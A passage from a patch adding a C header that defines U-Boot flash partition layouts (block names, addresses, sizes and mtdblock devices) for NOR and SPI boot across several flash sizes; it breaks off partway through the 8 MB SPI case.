+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0xB0020000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0xB01FADFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0xB01FB200
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x4000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0xB01FEDFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0xB01FEE00
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0xB01FFDFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME        "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR        0xB01FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE              0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR          0xB01FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0xB01FFFFF
+
+//4MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 4)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0020000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME           "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR           0xB0000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME          "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR          0xB0020000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME          "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR          0xB03F6DFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME            "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR            0xB03ECE00
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                  0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR              0xB03FCDFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME             "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR             0xB03FEE00
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                   0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR               0xB03FFDFF
+
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME         "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR         0xB03FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE               0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR           0xB03FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                         0xB03FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 8)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0020000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0xB0000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0xB0020000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0xB07EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0xB07EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0xB07FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0xB07FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0xB07FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0xB07FF000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x400
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0xB07FF3FF
+
+  #define IFX_CFG_FLASH_END_ADDR                         0xB07FFFFF
+
+
+#else
+  #error "ERROR!! Define flash size first!"
+#endif
+
+#else /*Not defined CONFIG_FIRMWARE_IN_ROOTFS*/
+//2MB flash partition
+#if (IFX_CONFIG_FLASH_SIZE == 2)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0020000\0"                                      \
+        "part2_begin=0xB00A0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"  \
+  "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0xB0000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME       "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR       0xB0020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE             0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME    "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0xB00A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0xB01FADFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0xB01FAE00
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x4000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0xB01FEDFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0xB01FEE00
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0xB01FFDFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME        "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR        0xB01FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE              0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR          0xB01FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0xB01FFFFF
+
+//4MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 4)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0020000\0"                                      \
+        "part2_begin=0xB00A0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME           "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR           0xB0000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME        "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR        0xB0020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE              0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME     "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME          "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR          0xB00A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0xB03EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0xB03EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0xB03FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME             "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR             0xB03FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                   0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR               0xB03FEFFF
+
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME         "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0xB03FF000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x400
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0xB03FF3FF
+
+
+  #define IFX_CFG_FLASH_END_ADDR                         0xB03FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 8)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0xB0000000\0"                                      \
+        "part1_begin=0xB0020000\0"                                      \
+        "part2_begin=0xB00A0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0xB0000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0xB0020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0xB00A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0xB07EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0xB07EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0xB07FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0xB07FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0xB07FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME          "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR          0xB07FF000
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE                0x400
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR            0xB07FF3FF
+  
+   #define IFX_CFG_FLASH_END_ADDR                          0xB07FFFFF
+
+
+#else
+  #error "ERROR!! Define flash size first!"
+#endif
+
+#endif /*CONFIG_FIRMWARE_IN_ROOTFS*/
+
+
+#endif /*CONFIG_BOOT_FROM_NOR*/
+
+/***************************************************************************/
+/***************************************************************************/
+/***************SPI FLASH map starts here***********************************/
+/***************************************************************************/
+/***************************************************************************/
+
+#ifdef CONFIG_BOOT_FROM_SPI
+
+#ifdef CONFIG_SPI_FLASH_1M
+#define IFX_CONFIG_FLASH_SIZE 1
+#elif CONFIG_SPI_FLASH_2M
+#define IFX_CONFIG_FLASH_SIZE 2
+#elif CONFIG_SPI_FLASH_4M
+#define IFX_CONFIG_FLASH_SIZE 4
+#elif CONFIG_SPI_FLASH_8M
+#define IFX_CONFIG_FLASH_SIZE 8
+#elif CONFIG_SPI_FLASH_16M
+#define IFX_CONFIG_FLASH_SIZE 16
+#endif
+
+#ifndef IFX_CONFIG_FLASH_SIZE
+#define IFX_CONFIG_FLASH_SIZE 4
+#endif
+
+#ifdef CONFIG_FIRMWARE_IN_ROOTFS
+//1MB flash partition
+#if (IFX_CONFIG_FLASH_SIZE == 1)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"  \
+  "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0x00020000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0x000F5FFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0x000F6000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x8000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0x001FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0x000FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0x000FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME        "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR        0x000FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE              0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR          0x000FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0x000FFFFF
+//2MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 2)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"  \
+  "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0x00010000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0x001F5FFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0x001F6000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x8000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0x001FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0x001FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0x001FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME        "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR        0x001FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE              0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR          0x001FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0x001FFFFF
+
+//4MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 4)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=6\0"
+        
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME           "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR           0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME          "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR          0x00010000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME          "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR          0x003F5FFF  
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME            "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR            0x003F6000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                  0x8000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR              0x003FDFFF
+
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME             "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR             0x003FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                   0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR               0x003FEFFF
+
+  #define IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME         "dectconfig"
+  #define IFX_CFG_FLASH_DECT_CFG_START_ADDR         0x003FFE00
+  #define IFX_CFG_FLASH_DECT_CFG_SIZE               0x0200
+  #define IFX_CFG_FLASH_DECT_CFG_END_ADDR           0x003FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                         0x003FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 8)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_DECT_CFG_BLOCK_NAME "\0"      \
+        "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
